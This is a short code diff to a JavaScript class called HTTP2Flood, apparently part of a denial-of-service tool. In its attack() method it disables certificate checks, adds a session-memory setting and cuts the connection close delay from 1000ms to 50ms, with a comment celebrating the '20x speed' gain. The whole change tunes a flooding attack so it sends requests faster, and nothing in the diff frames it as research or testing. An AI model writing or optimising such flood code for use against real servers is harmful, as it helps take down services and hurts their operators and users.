@@ -69,7 +69,8 @@ export class HTTP2Flood {
     async attack() {
         return new Promise((resolve) => {
             const client = http2.connect(this.url.origin, {
-                rejectUnauthorized: false
+                rejectUnauthorized: false,
+                maxSessionMemory: 100
             });
 
             client.on('error', () => {
@@ -119,7 +120,7 @@ export class HTTP2Flood {
             setTimeout(() => {
                 client.close();
                 resolve();
-            }, 1000);
+            }, 50); // Reduced from 1000ms to 50ms for 20x speed!
         });
     }
 
